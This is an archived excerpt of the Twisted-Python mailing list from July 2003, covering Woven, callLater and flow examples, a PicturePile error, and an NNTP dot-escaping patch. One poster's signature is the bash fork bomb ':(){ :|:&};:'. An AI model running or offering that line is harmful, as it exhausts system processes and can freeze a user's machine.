From: jml at ids.org.au (Jonathan Lange)
Date: Mon, 14 Jul 2003 03:18:08 +1000
Subject: [Twisted-Python] new bugtracker
In-Reply-To: <1058024658.28521.0.camel@biproc>
References: <20030712151650.GA7767@radii> <1058024658.28521.0.camel@biproc>
Message-ID: <20030713171808.GB15139@mumak.net>

On Sat, Jul 12, 2003 at 05:44:18PM +0200, Philippe Lafoucri?re wrote:
> On Sat, 2003-07-12 at 17:16, Christopher Armstrong wrote:
> > I've finished setting up Roundup to replace our sourceforge based
> > bugtracker. I've migrated most of the open bugs that were on
> > sourceforge; so everyone go create a user and get crackin'.
> > 
>
> What will be the future of Issues ?

As the Billy-Goats of Time cross the Bridge of Destiny and are attacked by the
Troll of Fate, so too must the Broom of Eternity sweep all things into the
Dustpan of History.

I tried to send an email to the list a week ago talking about the future of
Issues. Basically, if Twisted isn't using it, I'm not interested in
it. Further, I discourage further use and maintenance, as it doesn't have a
user base, and there are already too many partially-finished, under-used Free
Software projects in the world.

On a more personal note, I *do* think it kind of sucks that Issues isn't
getting used by Twisted, but I'm not particularly bitter about it. It's been
good working on it, and I hope to continue using Twisted and contributing to
it.

cheers,
jml
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030714/37dde0a2/attachment.pgp 

From lafou at wanadoo.fr  Sun Jul 13 05:23:43 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 13 Jul 2003 11:23:43 +0200
Subject: [Twisted-Python] PicturePile
Message-ID: <1058088222.28521.2.camel@biproc>

Hi

I'm trying to test to PicturePile files (from woven tutorial).
I have always the same error :


$ python picturepile.py /home/gravis/Images/
Traceback (most recent call last):
  File "picturepile.py", line 10, in ?
    class DirectoryListing(page.Page):
  File "picturepile.py", line 13, in DirectoryListing
    templateDirectory = os.path.split(os.path.abspath(__file__))[0]
NameError: name '__file__' is not defined


sounds like a bug, but I want to check with you




From mary-twisted at puzzling.org  Sun Jul 13 05:12:42 2003
From: mary-twisted at puzzling.org (Mary)
Date: Sun, 13 Jul 2003 19:12:42 +1000
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030713043613.8689.qmail@green.zadka.com>
References: <20030713022136.GB1862@titus.home.puzzling.org> <20030713043613.8689.qmail@green.zadka.com>
Message-ID: <20030713091242.GB2743@titus.home.puzzling.org>

On Sun, Jul 13, 2003, Moshe Zadka wrote:
> On Sun, 13 Jul 2003, Mary <mary-twisted at puzzling.org> wrote:
> 
> >     def getDynamicChild(self, name, request):
> >         return IndividualPage(amodel=self.getSubmodel('authors')[name]))
> 
> Rar! You are very evil.
> Please do not reinvent SQL in Python: write *another* select query, that
> only selects posts from this author.

I have to anyway... the SELECT query you saw doesn't extract any posts
at all, it extracts the names of authors (posts.names -- plus a little
extraneous information) who have made posts.

So I take it that in this design the arguments to __init__/initialize of
child IndividualPage would be just the name of the author?

This leaves a few questions still:

 1. Pure design issue: There still needs to be a query along the lines
 of "does this author in fact exist?" so that /author/Mary/ generates a
 list of my articles and /author/Humphrey/ generates an error page. This
 was the query I was trying to avoid by passing the submodel around --
 the "get me all posts by Mary" query was always going to be part of
 IndividualPage.

 At present, my model does not have the IndividualPage make a query to
 this effect, it relies on its parent AuthorsPage to have accessed a
 list of all authors in the system (actually, the SELECT query given
 ignores authors who have made no posts, a deliberate choice).

 Should I have IndividualPage access this information itself? If not, I
 still continue to rely on the information presently accesible to
 AuthorsPage -- how should I make this information available to
 IndividualPage? (related to point 3). If I don't use the authors model,
 then I have to make an essentially identical query anyway. There's a
 few options about where I make the query, how many times I make it, and
 where I should store the results. And of course, where (and how) I pass
 a Deferred around.

 2. More generally, since I'm unfamiliar with the design pattern(s)
 associated with Woven, what level of information sharing in this sense
 is acceptable between parents and children? (Pointers to other sources
 of information would be welcome, since this question is pretty open
 ended)?

 3. (Generalisation of point 1.) To whatever extent it is even
 acceptable to share query results of some kind between parents and
 children (perhaps in the form of Models), what functions do I call in
 Woven to share the information? Should an object ever access its own
 sub-models?

-Mary



From m at moshez.org  Sun Jul 13 06:04:03 2003
From: m at moshez.org (Moshe Zadka)
Date: 13 Jul 2003 10:04:03 -0000
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030713091242.GB2743@titus.home.puzzling.org>
References: <20030713091242.GB2743@titus.home.puzzling.org>, <20030713022136.GB1862@titus.home.puzzling.org> <20030713043613.8689.qmail@green.zadka.com>
Message-ID: <20030713100403.17396.qmail@green.zadka.com>

On Sun, 13 Jul 2003, Mary <mary-twisted at puzzling.org> wrote:

>  1. Pure design issue: There still needs to be a query along the lines
>  of "does this author in fact exist?" so that /author/Mary/ generates a
>  list of my articles and /author/Humphrey/ generates an error page. This
>  was the query I was trying to avoid by passing the submodel around --
>  the "get me all posts by Mary" query was always going to be part of
>  IndividualPage.

Ah, I see. Well, a somewhat thorny issue in current web code [that
we may fix someday in the future, but you're not interested in that]
is that child-getting is synchronous. This means that an easy answer
is currently beyond us. A non-easy way to do that is to hack around:

from twisted.web import resource, server

class MaybeIndividualPage(resource.Resource):

    isLeaf = 1

    def __init__(self, author):
        resource.Resource.__init__(self)
        self.author = author

    def render(self, request):
        def raiseException():
            raise LookupError
        def simulateServer(value):
            if value == server.NOT_DONE_YET:
                return
            request.write(value)
            request.finish()
        query = deferredWhichIsTrueIfExists(self.author).addCallback(
        lambda x: (x or error.NoResource()) and
             IndividualPage(self.author).getChildForRequest(request
                                            ).render(request)).addCallback(
            simulateServer)
        return server.NOT_DONE_YET

Then, in getDynamicChild, return MaybeIndividualPage(author) instead
of IndividualPage(author).

Basically, this is explicitly asyncing the child-getting mechanism
by going through the async-ready render method. I realize it's not
the best-looking code in the world, but it should get the job done.


>  2. More generally, since I'm unfamiliar with the design pattern(s)
>  associated with Woven, what level of information sharing in this sense
>  is acceptable between parents and children? (Pointers to other sources
>  of information would be welcome, since this question is pretty open
>  ended)?

Well, we don't have any real understanding of this issue either, since
Woven is not old enough. My gut instinct would be towards "pretty high",
though.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Sun Jul 13 08:24:34 2003
From: m at moshez.org (Moshe Zadka)
Date: 13 Jul 2003 12:24:34 -0000
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
Message-ID: <20030713122434.21978.qmail@green.zadka.com>

Those of you who heard my talks, either at Europython or Strakt, probably
remember me going on about how to use reactor.callLater(0,) to partition
algorithms into bite-size chunks, that would not delay the main loop too
much. This a topic which is interesting to me. I'm still waiting for glyph
to write the ultimate "What is Blocking" treatise, but I may give up and
write something myself. In the meantime, I want to present to advanced
examples of what you can achieve by using this technique.

optFactorial is an optimized version of the factorial function from my
talk. The trick here is to do 10 steps (or whatever argument is given
to us, if the user wants to optimize further by tweaking) at a time.
I have not profiled: possibly, it only becomes worth the complexity
at a much higher step number. However, this is an important example if
you are writing algorithms. It showcases how the assignment-paradigm
and the tail-call paradigm can be combined seamlessly to produce a
more complicated, but more efficient, whole.

def optFactorial(n, steps=10, d=None, acc=1L):
    d = d or defer.Deferred()
    for i in range(steps):
        if n==1: 
            d.callback(acc)
            break
        n, acc = n-1, acc*n
    else:
        reactor.callLater(0, optFactorial, n, steps, d, acc)
    return d

os_path_walk is a reimplementation of os.path.walk, from Python's
standard library, in an asynchronous manner. Here the word "asynchronous"
is literal: while it will call the visit() function with the same arguments,
in the same order, it does not guarantee when it will do so: certainly,
it is not likely to finish its work by the time it returns. yield, explicit
and implicit .next() calls and recursion combine to make sure that we will
never delay the mainloop more than the time it takes to do one os.listdir.
Note that unlike the os.path.walk function, here an exception anywhere
terminates the loop and lets us now of the failure. 

This example, in particular, shows how frighteningly similar Twisted
can be to threads :) In effect, this is much like doing something
like

reactor.runInThread(os.path.walk,
                    path,
                    lambda arg, dirname, filenames:
                        reactor.callFromThread(visit, arg, dirname, filenames),
                    arg)

except without the overhead of thread spawning and thread communication
[mutexes, etc.] However, note that many of the thread caveats remain:
if you have other code running, this code cannot know how many of the
visit() functions will be called by the time it runs.

from __future__ import generators
def os_path_walk(path, visit, arg):
    d = defer.Deferred()
    def walk(path):
        files = os.listdir(path)
        visit(arg, path, files)
        for file in files:
            yield None
            if os.path.isdir(file):
                for _ in walk(os.path.join(path, file):
                    pass
    next = walk(path).next
    def caller():
        try:
            next()
        except StopIteration:
            d.callback(None)
        except:
            d.errback(sys.exc_info()[1])
        else:
            reactor.callLater(0, caller)
    caller()
    return d

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From exarkun at twistedmatrix.com  Sun Jul 13 15:28:07 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Sun, 13 Jul 2003 15:28:07 -0400
Subject: [Twisted-Python] PicturePile
In-Reply-To: <1058088222.28521.2.camel@biproc>
References: <1058088222.28521.2.camel@biproc>
Message-ID: <20030713192422.GA24564@intarweb.us>

On Sun, Jul 13, 2003 at 11:23:43AM +0200, Philippe Lafoucri?re wrote:
> Hi
> 
> I'm trying to test to PicturePile files (from woven tutorial).
> I have always the same error :
> 
> 
> $ python picturepile.py /home/gravis/Images/
> Traceback (most recent call last):
>   File "picturepile.py", line 10, in ?
>     class DirectoryListing(page.Page):
>   File "picturepile.py", line 13, in DirectoryListing
>     templateDirectory = os.path.split(os.path.abspath(__file__))[0]
> NameError: name '__file__' is not defined
> 

  Run them with "twistd -y" instead of "python".

  I think the "if __name__ == '__main__':" checks should all be removed,
since clearly they won't work (file is never defined when that test is true).

  Jp

-- 
http://catandgirl.com/view.cgi?44
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030713/1c7c71c2/attachment.pgp 

From lafou at wanadoo.fr  Sun Jul 13 15:56:03 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 13 Jul 2003 21:56:03 +0200
Subject: [Twisted-Python] PicturePile
In-Reply-To: <20030713192422.GA24564@intarweb.us>
References: <1058088222.28521.2.camel@biproc>
	 <20030713192422.GA24564@intarweb.us>
Message-ID: <1058126163.927.1.camel@biproc>

>   Run them with "twistd -y" instead of "python".
> 
>   I think the "if __name__ == '__main__':" checks should all be removed,
> since clearly they won't work (file is never defined when that test is true).
> 
>   Jp

Ho that works better, thanks a lot.
why is there so many ways to create an application (I mean, via twistd,
mktap, directly via the python script, etc.) ? 




From Martin.Moellenbeck at t-online.de  Sun Jul 13 16:15:16 2003
From: Martin.Moellenbeck at t-online.de (=?iso-8859-1?Q?Martin_M=F6llenbeck?=)
Date: Sun, 13 Jul 2003 22:15:16 +0200
Subject: [Twisted-Python] new cred with pb
Message-ID: <001801c3497b$7a013390$0200a8c0@joshua>

hello,

is it possible to use the new cred with pb?

Has anybody an example or any howtos?

thanks and regards 

Martin





From bob at redivi.com  Sun Jul 13 16:47:38 2003
From: bob at redivi.com (Bob Ippolito)
Date: Sun, 13 Jul 2003 16:47:38 -0400
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713122434.21978.qmail@green.zadka.com>
Message-ID: <3D657434-B573-11D7-B516-000A95686CD8@redivi.com>

On Sunday, Jul 13, 2003, at 08:24 America/New_York, Moshe Zadka wrote:

> from __future__ import generators
> def os_path_walk(path, visit, arg):
>     d = defer.Deferred()
>     def walk(path):
>         files = os.listdir(path)
>         visit(arg, path, files)
>         for file in files:
>             yield None
>             if os.path.isdir(file):
>                 for _ in walk(os.path.join(path, file):
>                     pass
>     next = walk(path).next
>     def caller():
>         try:
>             next()
>         except StopIteration:
>             d.callback(None)
>         except:
>             d.errback(sys.exc_info()[1])
>         else:
>             reactor.callLater(0, caller)
>     caller()
>     return d

This is close to what I did when I wrote 'flow' (different from cce's), 
except I did the "caller" phase as a function-wrapper (akin to 
staticmethod or classmethod), and I made it smarter, such that it could 
return a value, get the result of a deferred (the next() wouldn't 
happen until the result of the deferred was ready), etc.

AFAIK, since cce's flow is in Twisted now, this example is better 
served using that.  Also, you should be showing people Failure() 
instead of sys.exc_info()[1].

-bob




From cce at clarkevans.com  Sun Jul 13 18:12:44 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Sun, 13 Jul 2003 22:12:44 +0000
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713122434.21978.qmail@green.zadka.com>
References: <20030713122434.21978.qmail@green.zadka.com>
Message-ID: <20030713221244.GA69058@polya.axista.com>

On Sun, Jul 13, 2003 at 12:24:34PM -0000, Moshe Zadka wrote:
| from __future__ import generators
| def os_path_walk(path, visit, arg):
|     d = defer.Deferred()
|     def walk(path):
|         files = os.listdir(path)
|         visit(arg, path, files)
|         for file in files:
|             yield None
|             if os.path.isdir(file):
|                 for _ in walk(os.path.join(path, file):
|                     pass
|     next = walk(path).next
|     def caller():
|         try:
|             next()
|         except StopIteration:
|             d.callback(None)
|         except:
|             d.errback(sys.exc_info()[1])
|         else:
|             reactor.callLater(0, caller)
|     caller()
|     return d

You could rewrite this using flow:

    from __future__ import generators
    import os
    from twisted.flow import flow
    
    def hierlistdir(path):
        names = os.listdir(path)
        yield (path, names)
        for name in names:
            subpath = os.path.join(path,name)
            if os.path.isdir(subpath):
                for x in hierlistdir(subpath):
                    yield x
    
    def process(path, visit, arg):
        lst = flow.wrap(hierlistdir(path))
        yield lst
        for (path, names) in lst:
            visit(arg, path, names)
            yield lst
    
    def os_path_walk(path, visit, arg):
        return flow.Deferred(process(path, visit, arg))

Although, really, if you were to use flow, you would not
bother to use a vistor pattern, you would just write
your processor as a generator instead.

    def print_if_contains(path, match):
        lst = flow.wrap(hierlistdir(path))
        nMatch = 0
        yield lst
        for (path, names) in lst:
            if match in names:
                nMatch += 1
                print nMatch, path
            yield lst
    
    d = flow.Deferred(print_if_contains("/some/path","someFile"))
    d.addCallback(lamda _: reactor.stop())

Where flow "shines" is when the input source blocks, for example,
when reading from a socket (see flow.Protocol), or via an async 
PostgreSQL database, or an LDAP connection.   Or when there are 
multiple stages of a given flow (a -> b -> c), or when you have
two stages (async PostgreSQL and LDAP queries) which need to
be merged to generate a HTML page...

Best,

Clark

P.S.  Here is the other example using flow

from __future__ import generators
from twisted.internet import reactor
from twisted.flow import flow
from twisted.python import util

def flowFactorial(n, steps = 10):
    coop = flow.Cooperate()
    acc = 1L
    while True:
        for i in range(steps):
            if 1 == n:
                yield acc
                return
            n, acc = n - 1, acc * n
        yield coop

d = flow.Deferred(flowFactorial(13))
d.addCallback(util.println)
d.addCallback(lambda _: reactor.stop())
reactor.run()




From cce at clarkevans.com  Sun Jul 13 18:43:18 2003
From: cce at clarkevans.com (Clark C. Evans)
Date: Sun, 13 Jul 2003 22:43:18 +0000
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713221244.GA69058@polya.axista.com>
References: <20030713122434.21978.qmail@green.zadka.com> <20030713221244.GA69058@polya.axista.com>
Message-ID: <20030713224318.GA69137@polya.axista.com>

My last example was wrong, pls disregard. Since hierlistdir does not 
yield a flow.Instruction (flow.Cooperate() or a flow.Stage) it does not
need to be wrapped.   Also, I forgot to have the intermediate 
generator yield flow.Cooperate to return control to the reactor. 
The last example would have been correct if hierlistdir() was
blocking, like an LDAP/SQL query, or a protocol.  Sorry.

    from __future__ import generators
    import os
    from twisted.flow import flow
    
    def hierlistdir(path):
        """ generator which returns a list of (path, files) 
            tuples for each item in the hierarchy.   Since this
            is a syncronous generator, you could simply do
                print list(hierlistdir("/Some/Path") 
            to verify its operation
        """
        names = os.listdir(path)
        yield (path, names)
        for name in names:
            subpath = os.path.join(path,name)
            if os.path.isdir(subpath):
                for x in hierlistdir(subpath):
                    yield x

    def coopvisit(path, visit, arg):
        """ for each item in the generator, call the visitor
            and then yield Cooperate() so that other requess
            can be handled by the reactor
        """
        for (path,names) in hierlistdir(path):
            visit(arg,path,names)
            yield flow.Cooperate()

    def os_path_walk(path,visit,arg):
        """ provide a nice interface that hides the use of flow,
            and somewhat complies with Moshe's example.
        """
        return flow.Deferred(coopvisit(path,visit,arg))

Although, really, if you were to use flow, you would not
bother to use a vistor pattern, you would just write
your processor as a generator instead.

    def print_if_contains(path, match):
        nMatch = 0
        for (path, names) in hierlistdir(path):
            if match in names:
                nMatch += 1
                print nMatch, path
            yield flow.Cooperate()
     
    d = flow.Deferred(print_if_contains("/some/path","someFile"))
    d.addCallback(lamda _: reactor.stop())

Where flow "shines" is when the input source blocks, for example,
when reading from a socket (see flow.Protocol), or via an async 
PostgreSQL database, or an LDAP connection.   Or when there are 
ultiple stages of a given flow (a -> b -> c), or when you have
two stages (async PostgreSQL and LDAP queries) which need to
be merged to generate a HTML page...

On Sun, Jul 13, 2003 at 12:24:34PM -0000, Moshe Zadka wrote:
| from __future__ import generators
| def os_path_walk(path, visit, arg):
|     d = defer.Deferred()
|     def walk(path):
|         files = os.listdir(path)
|         visit(arg, path, files)
|         for file in files:
|             yield None
|             if os.path.isdir(file):
|                 for _ in walk(os.path.join(path, file):
|                     pass
|     next = walk(path).next
|     def caller():
|         try:
|             next()
|         except StopIteration:
|             d.callback(None)
|         except:
|             d.errback(sys.exc_info()[1])
|         else:
|             reactor.callLater(0, caller)
|     caller()
|     return d

from __future__ import generators
from twisted.internet import reactor
from twisted.flow import flow
from twisted.python import util

def flowFactorial(n, steps = 10):
    coop = flow.Cooperate()
    acc = 1L
    while True:
        for i in range(steps):
            if 1 == n:
                yield acc
                return
            n, acc = n - 1, acc * n
        yield coop

d = flow.Deferred(flowFactorial(13))
d.addCallback(util.println)
d.addCallback(lambda _: reactor.stop())
reactor.run()
 



From smurf at smurf.noris.de  Sun Jul 13 18:53:48 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Mon, 14 Jul 2003 00:53:48 +0200
Subject: [Twisted-Python] t.p.nntp woes
Message-ID: <pan.2003.07.13.22.53.44.624640@smurf.noris.de>

Hi,

I seem to have found a few bugs in the current NNTP code.

- The client->server transfer does not escape leading '.' at all.
  To reproduce: edit the testcase to have one dot, not three.
- The server->client article transfer actually uses \r\r\n line endings.
  Ouch!
- The server->client code does not escape leading '.' when the
  linefeed/dot pair is on a block boundary.
- Article length is not preserved; the client drops the trailing
  linefeed when receiving article bodies.

Besides these easily-fixed problems, twisted.protocols.nntp stores
articles as a mix of host and network storage formats.

Network format has dots escaped and ends lines with CRLF.
Host format has dots not escaped and ends lines with LF only.

IMHO it doesn't make sense to mix these two. Either the NNTP code can
store the data in unchanged form (it needs to convert articles for local
processing), or it can't (it needs to convert articles when re-sending).
It doesn't make sense to require special handling in _both_ cases.

Since twisted.news.database expects CRLF line endings for header
analysis, I have changed the server side to use network format.

On the other hand, the client side should probably use host format,
since that is what a client usually needs.

In any way, the test case submits an article. It should get the original
article back, EXACTLY the way it was. The following patch fixes the code
so that this in fact happens.

This patch requires that article backends are updated (escape those
dots!). If that's unacceptable (personally I don't think so),
I might be persuaded to add a compatibility flag.


===== twisted/protocols/basic.py 1.38 vs edited =====
--- 1.38/twisted/protocols/basic.py	Wed Jun 25 14:06:38 2003
+++ edited/twisted/protocols/basic.py	Sun Jul 13 23:55:24 2003
@@ -340,7 +340,7 @@
     lastSent = ''
     deferred = None
 
-    def beginFileTransfer(self, file, consumer, transform):
+    def beginFileTransfer(self, file, consumer, transform = None):
         """Begin transferring a file
         
         @type file: Any file-like object
@@ -377,7 +377,8 @@
             self.consumer.unregisterProducer()
             return
         
-        chunk = self.transform(chunk)
+        if self.transform:
+            chunk = self.transform(chunk)
         self.consumer.write(chunk)
         self.lastSent = chunk[-1]
 
===== twisted/protocols/nntp.py 1.29 vs edited =====
--- 1.29/twisted/protocols/nntp.py	Thu Jul  3 22:55:47 2003
+++ edited/twisted/protocols/nntp.py	Mon Jul 14 00:10:18 2003
@@ -461,9 +461,11 @@
 
     def _stateArticle(self, line):
         if line != '.':
+            if line.startswith('.'):
+                line = line[1:]
             self._newLine(line, 0)
         else:
-            self.gotArticle('\n'.join(self._endState()))
+            self.gotArticle('\n'.join(self._endState())+'\n')
 
 
     def _stateHead(self, line):
@@ -475,16 +477,18 @@
 
     def _stateBody(self, line):
         if line != '.':
+            if line.startswith('.'):
+                line = line[1:]
             self._newLine(line, 0)
         else:
-            self.gotBody('\n'.join(self._endState()))
+            self.gotBody('\n'.join(self._endState())+'\n')
 
 
     def _headerPost(self, (code, message)):
         if code == 340:
-            self.transport.write(self._postText[0])
-            if self._postText[-2:] != '\r\n':
-                self.sendLine('\r\n')
+            self.transport.write(self._postText[0].replace('\n', '\r\n').replace('\r\n.', '\r\n..'))
+            if self._postText[0][-1] != '\n':
+                self.sendLine('')
             self.sendLine('.')
             del self._postText[0]
             self._newState(None, self.postFailed, self._headerPosted)
@@ -748,8 +752,6 @@
             defer = self.factory.backend.postRequest(article)
             defer.addCallbacks(self._gotPost, self._errPost)
         else:
-            if line and line[0] == '.':
-                line = line[1:]
             self.message = self.message + line + '\r\n'
 
 
@@ -792,8 +794,6 @@
             d = self.factory.backend.postRequest(article)
             d.addCallbacks(self._didTakeThis, self._errTakeThis)
         else:
-            if line and line[0] == '.':
-                line = line[1:]
             self.message = self.message + line + '\r\n'
 
 
@@ -859,15 +859,12 @@
         self.currentIndex = index
         self.sendLine('220 %d %s article' % (index, id))
         s = basic.FileSender()
-        d = s.beginFileTransfer(article, self.transport, self.transformChunk)
+        d = s.beginFileTransfer(article, self.transport)
         d.addCallback(self.finishedFileTransfer)
     
     ##   
-    ## Helpers for FileSender
+    ## Helper for FileSender
     ##
-    def transformChunk(self, chunk):
-        return chunk.replace('\n', '\r\n').replace('\r\n.', '\r\n..')
-
     def finishedFileTransfer(self, lastsent):
         if lastsent != '\n':
             line = '\r\n.'
@@ -931,8 +928,8 @@
             body = StringIO.StringIO(body)
         self.currentIndex = index
         self.sendLine('221 %d %s article retrieved' % (index, id))
         s = basic.FileSender()
-        d = s.beginFileTransfer(body, self.transport, self.transformChunk)
+        d = s.beginFileTransfer(body, self.transport)
         d.addCallback(self.finishedFileTransfer)
 
     def _errBody(self, failure):
@@ -1021,8 +1019,6 @@
             
             self.message = ''
         else:
-            if line.startswith('.'):
-                line = line[1:]
             self.message = self.message + line + '\r\n'
 
 
===== twisted/test/test_nntp.py 1.13 vs edited =====
--- 1.13/twisted/test/test_nntp.py	Thu Jul  3 22:55:47 2003
+++ edited/twisted/test/test_nntp.py	Mon Jul 14 00:05:40 2003
@@ -34,6 +34,8 @@
 User-Agent: tin/1.4.5-20010409 ("One More Nightmare") (UNIX) (Linux/2.4.17 (i686))
 
 this is a test
+.
+..
 ...
 lala
 moo
@@ -78,7 +80,7 @@
         self.assertEquals(len(info), 6)
         self.assertEquals(info, GROUP)
         
-        self.postArticle(string.replace(POST_STRING, '\n', '\r\n'))
+        self.postArticle(POST_STRING)
     
     
     def getSubscriptionsFailed(self, error):
@@ -89,7 +91,7 @@
         raise AssertionError("fetchGroup() failed: %s" % (error,))
 
 
-    def postFailed(self, err):
+    def postFailed(self, error):
         raise AssertionError("postArticle() failed: %s" % (error,))
 
 
@@ -98,15 +100,10 @@
 
     
     def gotArticle(self, info):
-        origPost = POST_STRING.replace('\n', '\r\n')
-        origBody = origPost.split('\r\n\r\n')[1]
-        newBody = info.split('\r\n\r\n', 1)[1]
-
-        # XXX The strip shouldn't be necessary, but I don't
-        # know where it needs fixing and I don't want to commit
-        # a broken test.  Tailing whitespace is irrelevant anyway. :)
-        self.assertEquals(origBody.strip(), newBody.strip())
+        origBody = POST_STRING.split('\n\n')[1]
+        newBody = info.split('\n\n', 1)[1]
 
+        self.assertEquals(origBody, newBody)
         
         # We're done
         self.transport.loseConnection()
-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
:huff: v. To compress data using a Huffman code. Various programs that
   use such methods have been called `HUFF' or some variant thereof. Oppose
   {puff}. Compare {crunch}, {compress}.




From itamar at itamarst.org  Sun Jul 13 21:36:03 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sun, 13 Jul 2003 21:36:03 -0400
Subject: [Twisted-Python] t.p.nntp woes
In-Reply-To: <pan.2003.07.13.22.53.44.624640@smurf.noris.de>
References: <pan.2003.07.13.22.53.44.624640@smurf.noris.de>
Message-ID: <20030713213603.43ecbcff.itamar@itamarst.org>

On Mon, 14 Jul 2003 00:53:48 +0200
Matthias Urlichs <smurf at smurf.noris.de> wrote:

> I seem to have found a few bugs in the current NNTP code.

In the future, when you have bugs - post the patch and bugs to the
bugtracker, and then post a short summary to the mailing list and a
pointer to issue in the tracker. That way the patch and the bugs won't
get lost, and the list will know this bug exists.

http://twistedmatrix.com/bugs/

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From smurf at smurf.noris.de  Mon Jul 14 01:47:51 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Mon, 14 Jul 2003 07:47:51 +0200
Subject: [Twisted-Python] t.p.nntp woes
References: <pan.2003.07.13.22.53.44.624640@smurf.noris.de> <20030713213603.43ecbcff.itamar@itamarst.org>
Message-ID: <pan.2003.07.14.05.47.49.305899@smurf.noris.de>

Hi, Itamar Shtull-Trauring wrote:

> On Mon, 14 Jul 2003 00:53:48 +0200
> Matthias Urlichs <smurf at smurf.noris.de> wrote:
> 
>> I seem to have found a few bugs in the current NNTP code.
> 
Copied to the bug tracker.

> In the future, when you have bugs

Nope -- in the future, when I have bugs, I should remember that there is
now a bug tracker. :-/

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
:bring X to its knees: v. [common] To present a machine, operating
   system, piece of software, or algorithm with a load so extreme or
   {pathological} that it grinds to a halt. "To bring a MicroVAX to its
   knees, try twenty users running {vi} -- or four running {EMACS}."
   Compare {hog}.




From tv at twistedmatrix.com  Sun Jul 13 11:46:40 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Sun, 13 Jul 2003 18:46:40 +0300
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713122434.21978.qmail@green.zadka.com>
References: <20030713122434.21978.qmail@green.zadka.com>
Message-ID: <20030713154640.GB1122@lapdog>

On Sun, Jul 13, 2003 at 12:24:34PM -0000, Moshe Zadka wrote:
> Those of you who heard my talks, either at Europython or Strakt, probably
> remember me going on about how to use reactor.callLater(0,) to partition
> algorithms into bite-size chunks, that would not delay the main loop too
> much. This a topic which is interesting to me. I'm still waiting for glyph

	Nice subject. I'd call it "how to block just a little" ;)

> def os_path_walk(path, visit, arg):
>     d = defer.Deferred()
>     def walk(path):
>         files = os.listdir(path)
>         visit(arg, path, files)
>         for file in files:
>             yield None
>             if os.path.isdir(file):

	You want

              if os.path.isdir(os.path.join(path, file)):


-- 
:(){ :|:&};:



From m at moshez.org  Mon Jul 14 04:25:06 2003
From: m at moshez.org (Moshe Zadka)
Date: 14 Jul 2003 08:25:06 -0000
Subject: [Twisted-Python] Twisted CallLater: Advanced Usage
In-Reply-To: <20030713154640.GB1122@lapdog>
References: <20030713154640.GB1122@lapdog>, <20030713122434.21978.qmail@green.zadka.com>
Message-ID: <20030714082506.891.qmail@green.zadka.com>

On Sun, 13 Jul 2003, Tommi Virtanen <tv at twistedmatrix.com> wrote:

> >             if os.path.isdir(file):
> 
> 	You want
> 
>               if os.path.isdir(os.path.join(path, file)):

Thanks, you're right.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From rich at enflyer.com  Mon Jul 14 11:51:04 2003
From: rich at enflyer.com (Rich Cavanaugh)
Date: Mon, 14 Jul 2003 11:51:04 -0400
Subject: [Twisted-Python] Woven and deferred models
Message-ID: <F9D6CFE4-B612-11D7-9D9A-000A95890854@enflyer.com>

I spent some time in #twisted this weekend looking for a solution to 
this and got some very helpful advice from phed and radix but no real 
solution to what looks like a bug.

The attached rpy is an example of what I'm trying to do. As is woven 
doesn't even touch the child nodes of my model="main" tag. Add 
view="None" and it at least gives me a trace-back on model="name" which 
is a step beyond not touching it at all.

If anyone has a better approach to this problem I'd appreciate the 
input. Basically I have some models that will take some time to fully 
initialize due to lots of database activity. The sub-models need all of 
this data in place. I'm trying to find a way to fully initialize a 
model before woven continues on to it's sub-models.

rich

-------------- next part --------------
A non-text attachment was scrubbed...
Name: rcur2.rpy
Type: application/applefile
Size: 463 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030714/2b4dad35/attachment.bin 
-------------- next part --------------
A non-text attachment was scrubbed...
Name: rcur2.rpy
Type: application/text
Size: 741 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030714/2b4dad35/attachment-0001.bin 

From don at motorola.com  Mon Jul 14 13:53:38 2003
From: don at motorola.com (Don Hiatt)
Date: Mon, 14 Jul 2003 12:53:38 -0500
Subject: [Twisted-Python] Accessing ClientFactory methods?
In-Reply-To: <20030714082506.891.qmail@green.zadka.com>
Message-ID: <FPEBLIAFGDEEOHHAGOKBIEBECCAA.don@motorola.com>

Sorry for the stupid questiong, but... :)

